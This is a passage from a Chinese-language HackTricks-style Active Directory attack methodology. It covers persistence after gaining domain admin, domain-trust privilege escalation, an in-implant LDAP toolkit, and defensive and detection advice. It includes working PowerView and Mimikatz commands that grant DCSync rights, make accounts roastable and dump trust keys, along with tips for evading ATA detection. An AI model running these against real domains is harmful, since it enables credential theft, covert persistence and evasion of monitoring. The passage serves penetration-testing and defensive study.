{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

一旦获得 **Domain Admin**，或更好的是 **Enterprise Admin** 权限，就可以 **dump** **domain database**：_ntds.dit_。

[**More information about DCSync attack can be found here**](dcsync.md)。

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

之前讨论的一些技术可以用于持久化。\
例如，你可以：

- 使用户容易受到 [**Kerberoast**](kerberoast.md) 攻击

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- 使用户容易受到 [**ASREPRoast**](asreproast.md) 攻击

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- 向用户授予 [**DCSync**](#dcsync) 权限

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** 通过使用 **NTLM hash**（例如 **PC account 的 hash**）为特定服务创建一个 **legitimate Ticket Granting Service (TGS) ticket**。该方法用于 **access the service privileges**。


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** 指攻击者在 Active Directory（AD）环境中获得 **krbtgt account 的 NTLM hash**。该账户非常特殊，因为它用于签署所有 **Ticket Granting Tickets (TGTs)**，而这些票据是 AD 网络内进行身份验证所必需的。

获得该 hash 后，攻击者可以为任意指定账户创建 **TGTs**（Silver ticket attack）。


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

这类票据类似于 golden tickets，但其伪造方式能够 **bypasses common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Having certificates of an account or being able to request them** 是实现用户账户持久化的非常好的一种方式（即使用户更改了密码）：


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Using certificates is also possible to persist with high privileges inside the domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory 中的 **AdminSDHolder** 对象通过在这些组之间应用标准的 **Access Control List (ACL)**，来确保 **privileged groups**（例如 Domain Admins 和 Enterprise Admins）的安全，防止未经授权的更改。然而，此功能也可能被利用：如果攻击者修改 AdminSDHolder 的 ACL，向普通用户授予完全访问权限，该用户就能广泛控制所有特权组。这项原本用于保护安全的机制因此可能适得其反；如果不进行密切监控，就会允许不应有的访问。

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

每个 **Domain Controller (DC)** 内都存在一个 **local administrator** 账户。通过获得此类计算机上的管理员权限，可以使用 **mimikatz** 提取本地 Administrator hash。随后需要修改注册表以 **enable the use of this password**，从而允许远程访问本地 Administrator 账户。


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

你可以向某个 **user** 授予其对特定域对象的某些 **special permissions**，使该用户将来能够 **escalate privileges**。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**security descriptors** 用于 **store** 某个 **object** 对另一个 **object** 所拥有的 **permissions**。如果你能够对某个对象的 **security descriptor** 进行哪怕很小的更改，就可以获得对该对象的非常有价值的权限，而无需成为特权组成员。


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

滥用 `dynamicObject` auxiliary class，使用 `entryTTL`/`msDS-Entry-Time-To-Die` 创建短生命周期的 principals/GPOs/DNS records；它们会自动删除且不留下 tombstones，从而擦除 LDAP 证据，同时留下孤立的 SIDs、失效的 `gPLink` references 或缓存的 DNS responses（例如 AdminSDHolder ACE pollution，或恶意的 `gPCFileSysPath`/AD-integrated DNS redirects）。

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

修改内存中的 **LSASS** 以建立一个 **universal password**，从而授予对所有域账户的访问权限。


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
你可以创建 **own SSP**，以 **capture** 用于访问计算机的 **credentials**，并以 **clear text** 形式获取。


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

它会在 AD 中注册一个 **new Domain Controller**，并利用该控制器向指定对象 **push attributes**（SIDHistory、SPNs 等），且不会留下任何关于这些 **modifications** 的 **logs**。你 **need DA** 权限，并且必须位于 **root domain** 内。\
请注意，如果使用了错误的数据，就会出现非常难看的日志。


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

前面我们讨论过，在拥有 **enough permission to read LAPS passwords** 时如何提升权限。不过，这些密码也可以用于 **maintain persistence**。\
请参阅：


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft 将 **Forest** 视为安全边界。这意味着，**compromising a single domain could potentially lead to the entire Forest being compromised**。<sup>[[1]](#references)</sup>

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) 是一种安全机制，允许来自一个 **domain** 的用户访问另一个 **domain** 中的资源。它本质上是在两个域的身份验证系统之间建立连接，使身份验证验证能够无缝流转。当域建立信任关系时，它们会在各自的 **Domain Controllers (DCs)** 中交换并保存特定的 **keys**，这些密钥对信任关系的完整性至关重要。

在典型场景中，如果用户希望访问 **trusted domain** 中的服务，必须先从其自身域的 DC 请求一种称为 **inter-realm TGT** 的特殊票据。该 TGT 使用两个域共同约定的共享 **key** 加密。随后，用户将此 TGT 提交给 **trusted domain 的 DC**，以获取服务票据（**TGS**）。在 trusted domain 的 DC 成功验证 inter-realm TGT 后，它会签发 TGS，授予用户访问该服务的权限。

**Steps**：

1. **Domain 1** 中的 **client computer** 使用其 **NTLM hash** 向其 **Domain Controller (DC1)** 请求 **Ticket Granting Ticket (TGT)**，启动该过程。
2. 如果客户端成功通过身份验证，DC1 会签发新的 TGT。
3. 客户端随后向 DC1 请求 **inter-realm TGT**，该票据用于访问 **Domain 2** 中的资源。
4. 作为双向域信任的一部分，inter-realm TGT 使用 DC1 和 DC2 之间共享的 **trust key** 加密。
5. 客户端将 inter-realm TGT 发送给 **Domain 2 的 Domain Controller (DC2)**。
6. DC2 使用共享的 trust key 验证 inter-realm TGT；如果票据有效，则为客户端希望访问的 Domain 2 服务器签发 **Ticket Granting Service (TGS)**。
7. 最后，客户端将此 TGS 提交给服务器。该 TGS 使用服务器账户的 hash 加密，用于获取 Domain 2 中服务的访问权限。

### Different trusts

需要注意的是，**trust 可以是 1 way 或 2 ways**。在 2 ways 选项中，两个域会相互信任；而在 **1 way** trust 关系中，一个域是 **trusted** 域，另一个是 **trusting** 域。在后一种情况下，**you will only be able to access resources inside the trusting domain from the trusted one**。

如果 Domain A 信任 Domain B，则 A 是 trusting domain，B 是 trusted domain。此外，在 **Domain A** 中，这被称为 **Outbound trust**；在 **Domain B** 中，则被称为 **Inbound trust**。

**Different trusting relationships**

- **Parent-Child Trusts**：这是同一 forest 内的常见设置，child domain 会自动与其 parent domain 建立双向、可传递的 trust。也就是说，身份验证请求可以在 parent 和 child 之间无缝流转。
- **Cross-link Trusts**：也称为 "shortcut trusts"，建立在 child domains 之间，用于加快 referral 过程。在复杂 forest 中，身份验证 referral 通常必须先向上到达 forest root，再向下到达目标 domain。通过创建 cross-links，可以缩短这一过程，这在地理位置分散的环境中特别有用。
- **External Trusts**：建立在不同且互不相关的 domains 之间，本质上不可传递。根据 [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)，external trusts 适用于访问当前 forest 外部、且未通过 forest trust 连接的 domain 中的资源。external trusts 通过 SID filtering 增强安全性。
- **Tree-root Trusts**：这些 trust 会在 forest root domain 与新添加的 tree root 之间自动建立。虽然并不常见，但 tree-root trusts 对向 forest 添加新的 domain trees 很重要，使其能够保留唯一的 domain name，并确保双向可传递性。更多信息请参阅 [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)。
- **Forest Trusts**：这是两个 forest root domains 之间的双向、可传递 trust，同时通过 SID filtering 进一步增强安全措施。
- **MIT Trusts**：这些 trust 与非 Windows、符合 [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) 的 Kerberos domains 建立。MIT trusts 更加专用，适用于需要与 Windows 生态系统之外的 Kerberos-based systems 集成的环境。

#### Other differences in **trusting relationships**

- trust relationship 也可以是 **transitive**（A trust B，B trust C，则 A trust C）或 **non-transitive**。
- trust relationship 可以设置为 **bidirectional trust**（双方相互信任）或 **one-way trust**（仅一方信任另一方）。

### Attack Path

1. **Enumerate** trusting relationships
2. 检查是否有任何 **security principal**（user/group/computer）能够 **access** **other domain** 的资源，例如通过 ACE 条目，或属于另一个 domain 的组。查找 **relationships across domains**（这很可能正是创建 trust 的原因）。
1. 在这种情况下，kerberoast 也可能是另一种选择。
2. **Compromise** 能够在 domains 之间进行 **pivot** 的 **accounts**。

可以通过三种主要机制访问另一个 domain 中资源的攻击者：

- **Local Group Membership**：Principals 可能被添加到计算机上的本地组中，例如服务器上的 “Administrators” 组，从而获得对该计算机的重要控制权。
- **Foreign Domain Group Membership**：Principals 也可能是 foreign domain 中组的成员。不过，这种方法的有效性取决于 trust 的性质以及组的作用范围。
- **Access Control Lists (ACLs)**：Principals 可能被指定在 **ACL** 中，尤其是作为 **DACL** 内 **ACEs** 中的实体，从而获得对特定资源的访问权限。若想深入了解 ACLs、DACLs 和 ACEs 的工作机制，白皮书 “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” 是非常有价值的资源。<sup>[[17]](#references)</sup>

### Find external users/groups with permissions

你可以检查 **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**，以查找域中的 foreign security principals。这些对象将是来自 **an external domain/forest** 的 user/group。

你可以在 **Bloodhound** 中检查这一点，或使用 powerview：
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### 子域到父域林权限提升
```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
枚举域信任的其他方法：
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> 存在 **2 个受信任密钥**，一个用于 _Child --> Parent_，另一个用于 _Parent_ --> _Child_。\
> 你可以使用以下命令获取当前域使用的密钥：
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

通过滥用信任关系并注入 SID-History，将权限提升为子域/父域中的 Enterprise admin：


{{#ref}}
sid-history-injection.md
{{#endref}}

#### 利用可写的 Configuration NC

了解如何利用 Configuration Naming Context (NC) 至关重要。在 Active Directory (AD) 环境中，Configuration NC 作为整个 forest 的配置数据中央存储库。该数据会复制到 forest 内的每个 Domain Controller (DC)，其中可写 DC 会维护 Configuration NC 的可写副本。要实施利用，必须在 DC 上拥有 **SYSTEM 权限**，最好是子域 DC 上的权限。

**将 GPO 链接到根 DC 站点**

Configuration NC 的 Sites 容器包含 AD forest 内所有已加入域计算机的站点信息。通过在任意 DC 上以 SYSTEM 权限运行，攻击者可以将 GPO 链接到根 DC 站点。此操作可能会通过操纵应用于这些站点的策略来危害根域。

如需深入了解，可以参考关于 [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4) 的研究。<sup>[[12]](#references)</sup>

**Compromise any gMSA in the forest**

一种攻击路径是针对域中的特权 gMSA。用于计算 gMSA 密码的 KDS Root key 存储在 Configuration NC 中。在任意 DC 上拥有 SYSTEM 权限后，便可以访问 KDS Root key，并计算 forest 中任意 gMSA 的密码。

详细分析和分步指南请参阅：


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

补充的 delegated MSA attack（BadSuccessor – abusing migration attributes）：


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

其他外部研究：[Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)。<sup>[[13]](#references)</sup>

**Schema change attack**

此方法需要耐心，等待新的特权 AD 对象创建出来。拥有 SYSTEM 权限后，攻击者可以修改 AD Schema，使任意用户获得对所有类的完全控制权。这可能导致对新创建 AD 对象的未授权访问和控制。

更多信息请参阅 [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)。<sup>[[14]](#references)</sup>

**From DA to EA with ADCS ESC5**

ADCS ESC5 vulnerability 针对 Public Key Infrastructure (PKI) 对象的控制权，用于创建一个 certificate template，使攻击者能够以 forest 内任意用户的身份进行 authentication。由于 PKI 对象位于 Configuration NC 中，控制一个可写的子域 DC 后即可执行 ESC5 attacks。

更多详情请参阅 [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)。<sup>[[15]](#references)</sup> 在没有 ADCS 的场景中，攻击者仍然可以设置所需组件，具体讨论见 [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)。<sup>[[16]](#references)</sup>

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
在此场景中，**你的域受到**外部域的信任，因此你对该外部域拥有**未确定的权限**。你需要找出**你所在域的哪些 principals 对外部域拥有哪些访问权限**，然后尝试利用这些权限：


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### 外部 Forest Domain - 单向（Outbound）
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
在此场景中，**你的域**正在向来自**不同域**的主体授予某些**权限**。

然而，当一个**域被信任**时，信任该域的域会创建一个使用**可预测名称**的用户，并将**被信任域的密码**用作该用户的**密码**。这意味着，可以**访问信任域中的用户，以进入被信任域**，对其进行枚举，并尝试进一步提升权限：


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

另一种攻陷被信任域的方法，是寻找一个创建方向与域信任**相反**的 [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links)（这种情况并不常见）。

另一种攻陷被信任域的方法，是在一台**被信任域用户可以访问**的机器上等待其通过 **RDP** 登录。然后，攻击者可以向 RDP 会话进程中注入代码，并从那里**访问受害者的源域**。\
此外，如果**受害者挂载了其硬盘**，攻击者可以通过 **RDP 会话**进程将**后门**存储在该硬盘的**启动文件夹**中。这种技术称为 **RDPInception。**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### 域信任滥用缓解措施

### **SID Filtering：**

- 利用跨 forest trust 的 SID history 属性发起攻击的风险，可通过 SID Filtering 缓解；默认情况下，所有 inter-forest trust 都会启用该功能。这基于以下假设：intra-forest trust 是安全的，因为根据 Microsoft 的立场，安全边界应视为 forest，而不是 domain。
- 但是，这也存在一个问题：SID filtering 可能会中断应用程序和用户访问，因此有时会被停用。

### **Selective Authentication：**

- 对于 inter-forest trust，使用 Selective Authentication 可确保来自两个 forest 的用户不会被自动认证。相反，用户必须获得明确的权限，才能访问信任域或 forest 中的域和服务器。
- 需要注意的是，这些措施无法防御对可写 Configuration Naming Context (NC) 的利用，也无法防御针对 trust account 的攻击。

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## 来自主机内 Implant 的基于 LDAP 的 AD Abuse

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) 将 bloodyAD 风格的 LDAP 原语重新实现为 x64 Beacon Object Files，可完全在主机内的 implant（例如 Adaptix C2）中运行。Operators 使用 `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` 编译该工具包，加载 `ldap.axs`，然后从 beacon 中调用 `ldap <subcommand>`。所有流量都通过当前登录安全上下文，经由带有 signing/sealing 的 LDAP（389），或经由带有自动证书信任的 LDAPS（636）传输，因此不需要 socks proxies 或磁盘 artifacts。<sup>[[4]](#references)</sup>

### Implant 侧 LDAP 枚举

- `get-users`、`get-computers`、`get-groups`、`get-usergroups` 和 `get-groupmembers` 将短名称/OU 路径解析为完整 DN，并导出对应对象。
- `get-object`、`get-attribute` 和 `get-domaininfo` 从 `rootDSE` 获取任意属性（包括 security descriptors）以及 forest/domain 元数据。
- `get-uac`、`get-spn`、`get-delegation` 和 `get-rbcd` 直接从 LDAP 中公开 roasting candidates、delegation settings 以及现有的 [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors。
- `get-acl` 和 `get-writable --detailed` 解析 DACL，列出 trustees、权限（GenericAll/WriteDACL/WriteOwner/attribute writes）以及 inheritance，从而立即确定 ACL privilege escalation 的目标。
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### 用于提权与持久化的 LDAP 写入原语

- 对象创建 BOF（`add-user`、`add-computer`、`add-group`、`add-ou`）允许操作员在具备 OU 权限的位置准备新的主体或机器账户。找到写入属性权限后，`add-groupmember`、`set-password`、`add-attribute` 和 `set-attribute` 可直接劫持目标。
- 以 ACL 为重点的命令，例如 `add-ace`、`set-owner`、`add-genericall`、`add-genericwrite` 和 `add-dcsync`，可将任意 AD 对象上的 WriteDACL/WriteOwner 转化为密码重置、组成员控制或 DCSync 复制权限，且不会留下 PowerShell/ADSI 痕迹。对应的 `remove-*` 命令可清理注入的 ACE。

### Delegation、roasting 与 Kerberos 滥用

- `add-spn`/`set-spn` 可立即使被攻陷的用户具备 Kerberoast 条件；`add-asreproastable`（UAC 切换）可将其标记为 AS-REP roasting 目标，而无需触碰密码。
- Delegation 宏（`add-delegation`、`set-delegation`、`add-constrained`、`add-unconstrained`、`add-rbcd`）可从 beacon 重写 `msDS-AllowedToDelegateTo`、UAC 标志或 `msDS-AllowedToActOnBehalfOfOtherIdentity`，从而启用 constrained/unconstrained/RBCD 攻击路径，并不再需要远程 PowerShell 或 RSAT。

### sidHistory 注入、OU 重定位与攻击面塑造

- `add-sidhistory` 可将高权限 SID 注入受控主体的 SID history（参见 [SID-History Injection](sid-history-injection.md)），通过 LDAP/LDAPS 完成隐蔽的访问继承。
- `move-object` 可更改计算机或用户的 DN/OU，使攻击者能够先将资产拖入已有委派权限的 OU，然后滥用 `set-password`、`add-groupmember` 或 `add-spn`。
- 范围严格限定的移除命令（`remove-attribute`、`remove-delegation`、`remove-rbcd`、`remove-uac`、`remove-groupmember` 等）允许操作员在获取凭据或建立持久化后快速回滚，最大限度减少 telemetry。

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## 一般防御措施

[**在此了解更多凭据保护方法。**](../stealing-credentials/credentials-protections.md)

### **凭据保护的防御措施**

- **Domain Admins 限制**：建议仅允许 Domain Admins 登录 Domain Controllers，避免在其他主机上使用这些账户。
- **Service Account 权限**：服务不应使用 Domain Admin（DA）权限运行，以维护安全性。
- **临时权限限制**：对于需要 DA 权限的任务，应限制其持续时间。可通过以下方式实现：`Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay 缓解**：审计事件 ID 2889/3074/3075，然后在 DC/客户端上强制启用 LDAP signing 以及 LDAPS channel binding，以阻止 LDAP MITM/relay 尝试。

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impacket 活动的协议级指纹识别

如果希望检测常见的 AD tradecraft，**不要只依赖由操作员控制的痕迹**，例如重命名的二进制文件、服务名称、临时批处理文件或输出路径。应建立合法 Windows 客户端构造 [Kerberos](kerberos-authentication.md)、[NTLM](../ntlm/README.md)、SMB、LDAP、DCE/RPC 和 WMI 流量的基线，然后寻找即使操作员编辑了 `psexec.py`、`wmiexec.py`、`dcomexec.py`、`atexec.py` 或 `ntlmrelayx.py` 后仍会保留的**实现特征**。<sup>[[8]](#references)</sup>

- **高置信度的独立候选特征**（在根据自身基线验证后）：
- 使用 `auth_context_id = 79231 + ctx_id` 的已认证 DCE/RPC
- 填充为 `0xff` 的 DCE/RPC authentication padding
- LDAP Kerberos binds 将原始 Kerberos `AP-REQ` 直接放入 SPNEGO `mechToken`
- 带有类似 ASCII 的 `ClientGuid` 值的 SMB2/3 negotiate 请求
- 使用非标准命名空间 `//./root/cimv2` 的 WMI `IWbemLevel1Login::NTLMLogin`
- 硬编码的 Kerberos nonce 值
- **更适合作为关联/评分特征**：
- 稀疏或重复的 Kerberos etype 列表、异常/缺失的 `PA-DATA`，或不同于原生 Windows 的 TGS-REQ etype 排序
- 缺少版本信息的 NTLM Type 1 消息，或主机名为 null 的 Type 3 消息
- DCE/RPC 中携带的原始 NTLMSSP（而非 SPNEGO）、缺失 DCE/RPC verification trailers，或 SPNEGO/Kerberos OID 不匹配
- 来自同一主机/用户/会话/时间窗口的多个此类特征，其可信度远高于任何单一弱字段
- **用作 enrichment，而非独立告警**：
- 默认文件名、输出路径、随机服务名称、临时批处理文件名、默认计算机账户名称，以及特定工具的 HTTP/WebDAV/RDP/MSSQL 字符串
- 操作员很容易修改这些特征，因此最好将其用于解释为何某个跨协议集群可疑
- **运行注意事项**：
- 某些信号需要解密流量、[PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md)、ETW 或服务端可见性
- 在将其提升为告警前，应根据 Samba/Linux 客户端、设备和旧版软件进行验证
- 随着对基线的信心提升，将检测从 enrichment -> hunting -> alerting 逐步升级

### **实施 Deception 技术**

- 实施 deception 包括设置陷阱，例如部署具有密码永不过期或标记为 Trusted for Delegation 等特征的诱饵用户或计算机。详细方法包括创建具有特定权限的用户，或将其添加到高权限组。<sup>[[2]](#references)</sup>
- 一个实际示例是使用以下工具：`Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- 有关部署 deception 技术的更多信息，请参见 [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception)。

### **识别 Deception**

- **对于用户对象**：可疑指标包括异常的 ObjectSID、低频登录、创建日期以及较低的错误密码计数。
- **一般指标**：将潜在诱饵对象的属性与真实对象的属性进行比较，可以发现不一致之处。[HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) 等工具可协助识别此类 deception。

### **绕过检测系统**

- **Microsoft ATA Detection Bypass**：
- **用户枚举**：避免在 Domain Controllers 上进行会话枚举，以防止触发 ATA 检测。
- **票据冒充**：使用 **aes** 密钥创建票据，有助于通过避免降级到 NTLM 来规避检测。
- **DCSync 攻击**：建议从非 Domain Controller 执行，以避免触发 ATA 检测；直接从 Domain Controller 执行将触发告警。

## References

- [1] [攻击 Domain Trusts 指南](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [在 Active Directory 中伪造 Trusts 进行 Deception](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [从 Domain Admin 到 Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – 用于 Active Directory Exploitation 的内存中 LDAP Toolkit](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck！将 NTLM Hash weaponize 为 Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF（NetExec AD Lab）– Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – 剖析 Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon：通过 Netlogon 接管 Active Directory 账户](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - 如何管理与 CVE-2020-1472 相关的 Netlogon 安全通道连接变更](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [深入探索被遗忘的 Null Session 和 MS-RPC 接口](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter 作为域之间的安全边界？（第 4 部分）- 绕过 SID filtering 研究](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter 作为域之间的安全边界？（第 5 部分）- Golden GMSA trust attack - 从 child 到 parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter 作为域之间的安全边界？（第 6 部分）- Schema change trust attack - 从 child 到 parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [使用 ESC5 从 DA 到 EA](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [通过滥用 AD CS，在 5 分钟内从 child domain 的管理员提升为 enterprise admins：后续篇](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [袖中的 ACE：设计 Active Directory DACL 后门](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
{{#include ../../banners/hacktricks-training.md}}
